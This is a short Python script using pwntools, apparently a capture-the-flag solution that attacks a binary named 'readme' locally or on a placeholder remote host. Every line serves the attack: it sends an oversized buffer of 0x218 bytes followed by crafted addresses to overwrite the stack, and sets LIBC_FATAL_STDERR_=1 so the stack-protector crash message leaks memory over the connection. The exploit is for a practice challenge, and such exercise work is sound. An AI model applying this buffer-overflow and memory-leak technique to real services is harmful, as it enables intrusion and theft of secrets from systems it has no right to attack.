#!/usr/bin/env python3

from pwn import *

exe = ELF("./readme")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.sendline("A"*0x218 + p64(0x400d20) + p64(0) + p64(0x600d20))
    r.sendline("LIBC_FATAL_STDERR_=1")

    
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
